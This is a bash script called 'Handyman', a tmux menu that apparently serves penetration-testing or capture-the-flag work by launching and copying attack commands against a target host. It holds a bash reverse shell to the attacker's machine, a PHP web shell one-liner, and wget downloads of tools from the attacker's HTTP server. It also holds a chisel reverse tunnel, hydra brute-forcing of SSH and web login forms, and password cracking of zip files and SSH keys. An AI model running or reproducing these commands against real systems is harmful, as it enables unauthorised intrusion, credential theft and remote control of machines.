#! /bin/bash

# Colours!
NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTGRAY='\033[0;37m'
DARKGRAY='\033[1;30m'
LIGHTRED='\033[1;31m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTPURPLE='\033[1;35m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'

LHOST=10.9.233.39
EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml

COMMAND_2='Serve tools'
COMMAND_3='Upload handyman'
COMMAND_4='sudo vim /etc/hosts'

COMMAND_e1='rustscan -a $RHSOT -- -sV -sC | highlight "^\d+\/tcp"'
COMMAND_e2='nmap -sV -sC $RHOST | highlight "^\d+\/tcp"'
COMMAND_e3='ffuf -v -c -recursion -t 64 -e $EXTS -w "$W_COMMON" -u http://$RHOST/FUZZ'
COMMAND_e4='gobuster dir -e -l -t 64 -w "$W_COMMON" -x $EXTS -u http://$RHOST | highlight "200|30[12]"'
COMMAND_e5='whatweb -v $RHOST'

COMMAND_5='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST ssh -s PORT'
COMMAND_6='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
COMMAND_7='ssh $USER@$RHOST -p 22'
COMMAND_9='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$RHOST/login.php -d "key=FUZZ"'
COMMAND_a='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
COMMAND_b='binwalk -e file.jpg'
COMMAND_c='steghide extract -sf file.jpg'
COMMAND_d='7z x file.zip'
COMMAND_e='python /usr/share/john/ssh2john.py key > key.hash'
COMMAND_f='john key.hash --wordlist=$W_PASSWORD --format=FORMAT'
COMMAND_g='nc -nlvp 4444'
COMMAND_h='chisel server -p 9999 --reverse -v'

COMMAND_u1='scp ~/Tools/linpeas.sh $USER@$RHOST:/tmp'
COMMAND_u2='scp ~/Tools/chisel $USER@$RHOST:/tmp'

CLIP_1="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
CLIP_2="export TERM=xterm"
CLIP_3="stty raw -echo; fg"
CLIP_4='<?php system($_GET["c"]); ?>'
CLIP_5="bash -i >& /dev/tcp/$LHOST/4444 0>&1"
CLIP_6="wget -O /tmp/handyman http://$LHOST:8000/handyman_cp"
CLIP_7="wget -O /tmp/chisel http://$LHOST:8000/chisel"
CLIP_8="/tmp/chisel client $LHOST:9999 R:$LHOST:8888:127.0.0.1:[OPEN_PORT]"

show_menus() {
  clear
  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo -e "                 ${ORANGE}$LHOST${NOCOLOR} - Handyman - ${RED}$RHOST${NOCOLOR}"
  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo -e "  ${LIGHTGREEN}Setup${NOCOLOR}"
  echo -e "  ------"
  echo -e "  ${YELLOW}1${NOCOLOR}) Setup target (${YELLOW}R${NOCOLOR}HOST)"
  echo -e "  ${YELLOW}2${NOCOLOR}) $COMMAND_2"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Enumeration${NOCOLOR}"
  echo -e "  -------------"
  echo -e "  ${YELLOW}e1${NOCOLOR}) $COMMAND_e1"
  echo -e "  ${YELLOW}e2${NOCOLOR}) $COMMAND_e2"
  echo -e "  ${YELLOW}e3${NOCOLOR}) $COMMAND_e3"
  echo -e "  ${YELLOW}e4${NOCOLOR}) $COMMAND_e4"
  echo -e "  ${YELLOW}e5${NOCOLOR}) $COMMAND_e5"
  echo -e ""
  echo -e "  ${YELLOW}5${NOCOLOR}) $COMMAND_5"
  echo -e "  ${YELLOW}6${NOCOLOR}) $COMMAND_6"
  echo -e "  ${YELLOW}7${NOCOLOR}) $COMMAND_7"
  echo -e "  ${YELLOW}8${NOCOLOR}) $COMMAND_8"
  echo -e "  ${YELLOW}9${NOCOLOR}) $COMMAND_9"
  echo -e "  ${YELLOW}a${NOCOLOR}) $COMMAND_a"
  echo -e "  ${YELLOW}b${NOCOLOR}) $COMMAND_b"
  echo -e "  ${YELLOW}c${NOCOLOR}) $COMMAND_c"
  echo -e "  ${YELLOW}d${NOCOLOR}) $COMMAND_d"
  echo -e "  ${YELLOW}e${NOCOLOR}) $COMMAND_e"
  echo -e "  ${YELLOW}f${NOCOLOR}) $COMMAND_f"
  echo -e "  ${YELLOW}g${NOCOLOR}) $COMMAND_g"
  echo -e "  ${YELLOW}h${NOCOLOR}) $COMMAND_h"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Upload${NOCOLOR}"
  echo -e "  ------"
  echo -e "  ${YELLOW}u1${NOCOLOR}) $COMMAND_u1"
  echo -e "  ${YELLOW}u2${NOCOLOR}) $COMMAND_u2"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Links${NOCOLOR}"
  echo -e "  -----"
  echo -e "  http://$RHOST/robots.txt"
  echo -e "  https://gtfobins.github.io/"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Clipboard${NOCOLOR}"
  echo -e "  ---------"
  echo -e "  ${YELLOW}c1${NOCOLOR}) $CLIP_1"
  echo -e "  ${YELLOW}c2${NOCOLOR}) $CLIP_2"
  echo -e "  ${YELLOW}c3${NOCOLOR}) $CLIP_3"
  echo -e "  ${YELLOW}c4${NOCOLOR}) $CLIP_4"
  echo -e "  ${YELLOW}c5${NOCOLOR}) $CLIP_5"
  echo -e "  ${YELLOW}c6${NOCOLOR}) $CLIP_6"
  echo -e "  ${YELLOW}c7${NOCOLOR}) $CLIP_7"
  echo -e "  ${YELLOW}c8${NOCOLOR}) $CLIP_8"
  echo -e ""
  echo -e "  e(${RED}x${NOCOLOR})it. Exit"
  echo -e ""
}

exportRHOST() {
  CLIPBOARD=$(xclip -o)

  if [[ $CLIPBOARD =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    if [ -z $RHOST]; then
      export RHOST=$CLIPBOARD

      tmux send-keys "x" ENTER
      tmux send-keys "export RHOST=$CLIPBOARD" ENTER
      tmux send-keys "$0" ENTER
    fi
  else
    if [ $1 = 1 ]; then
      tmux split-window -v
      sleep 0.1

      tmux send-keys "export RHOST="
    fi
  fi
}

exportLHOST() {
  if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    export LHOST=$1
  fi
}

runServeTools() {
  tmux setenv LHOST $LHOST
  tmux setenv RHOST $RHOST
  tmux setenv USER $USER

  tmux split-window -v
  sleep 0.1

  # Setup handyman with correct LHOST
  tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" ENTER
  tmux send-keys 'sed -i "s/L_H_O_S_T/$LHOST/g" ~/Tools/handyman_cp' ENTER
  tmux send-keys 'cd ~/Tools' 'C-m'
  
  # Serve the Tools/ folder
  if [ ! command -v python3 &> /dev/null ]; then
    tmux send-keys "python -m SimpleHTTPServer" ENTER
  else
    tmux send-keys "python3 -m http.server" ENTER
  fi
}

runUploadHandyman() {
  tmux setenv LHOST $LHOST
  tmux setenv RHOST $RHOST
  tmux setenv USER $USER

  tmux split-window -v
  sleep 0.1

  tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" ENTER
  sleep 0.1

  tmux send-keys 'sed -i "s/L_H_O_S_T/$LHOST/g" ~/Tools/handyman_cp' ENTER
  sleep 0.1

  tmux send-keys "scp ~/Tools/handyman_cp $USER@$RHOST:/tmp/handyman"
}

runV() {
  tmux setenv LHOST $LHOST
  tmux setenv RHOST $RHOST
  tmux setenv USER $USER

  tmux split-window -v
  sleep 0.1
  C="$@"
  tmux send-keys "$C"
}

runC() {
  echo "$@" | xclip -sel c

  echo "COPIED!"
}

runExit() {
  exit 0
}

read_options() {
  local choice
  read -p "Enter choice: " choice
  case $choice in
    1) exportRHOST 1;;
    R) exportRHOST 1;;

    2) runServeTools;;

    3) runUploadHandyman;;

    4) runV $COMMAND_4;;

    e1) runV $COMMAND_e1;;
    e2) runV $COMMAND_e2;;
    e3) runV $COMMAND_e3;;
    e4) runV $COMMAND_e4;;
    e5) runV $COMMAND_e5;;

    5) runV $COMMAND_5;;
    6) runV $COMMAND_6;;
    7) runV $COMMAND_7;;
    8) runV $COMMAND_8;;
    9) runV $COMMAND_9;;
    a) runV $COMMAND_a;;
    b) runV $COMMAND_b;;
    c) runV $COMMAND_c;;
    d) runV $COMMAND_d;;
    e) runV $COMMAND_e;;
    f) runV $COMMAND_f;;
    g) runV $COMMAND_g;;
    h) runV $COMMAND_h;;

    u1) runV $COMMAND_u1;;
    u2) runV $COMMAND_u2;;

    c1) runC $CLIP_1;;
    c2) runC $CLIP_2;;
    c3) runC $CLIP_3;;
    c4) runC $CLIP_4;;
    c5) runC $CLIP_5;;
    c6) runC $CLIP_6;;
    c7) runC $CLIP_7;;
    c8) runC $CLIP_8;;

    x) runExit;;
    exit) runExit;;
  esac
}

do_menu() {
  while true
  do
    show_menus
    read_options
  done
}

if [ ! -z "$1" ]; then
  exportLHOST $1
fi

exportRHOST 0

do_menu
